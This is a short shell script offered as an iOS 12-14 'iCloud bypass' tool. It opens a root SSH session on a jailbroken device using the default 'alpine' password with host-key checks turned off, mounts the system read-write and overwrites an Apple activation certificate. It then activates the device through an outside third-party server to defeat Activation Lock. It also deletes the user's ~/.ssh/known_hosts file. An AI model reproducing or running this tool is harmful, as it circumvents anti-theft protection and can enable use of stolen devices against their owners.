
# iOS 12-14 Signal iCloud Bypass

if ! which curl >> /dev/null; then
    echo "Error: curl not found"
    exit 1
fi
if ! which iproxy >> /dev/null; then
    echo "Error: iproxy not found"
    exit 1
fi

rm -rf ~/.ssh/known_hosts
clear

# Change the current working directory
cd "`dirname "$0"`"


echo 'Starting iproxy...'

killall iproxy
idevicepair pair
#iproxy 2222:22 > /dev/null 2>&1 &
iproxy 2222 22 &>/dev/null &
echo ""
echo "

 ⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡
 ⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡
 ⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡⚡
 
"
echo ""

sleep 2
    
echo 'Mounting filesystem as read-write'
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost -p2222 'mount_filesystems'

echo 'Running iCloud Bypass...'
sshpass -p 'alpine' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@localhost -p2222 'cp -f /System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/FactoryActivation.pem /System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem'


sleep 2

# Kill iproxy
kill %1 > /dev/null 2>&1

ideviceactivation activate -s https://hackt1vator.github.io/miunlock/activator.php -d

echo 'bypass Done!'

echo ''
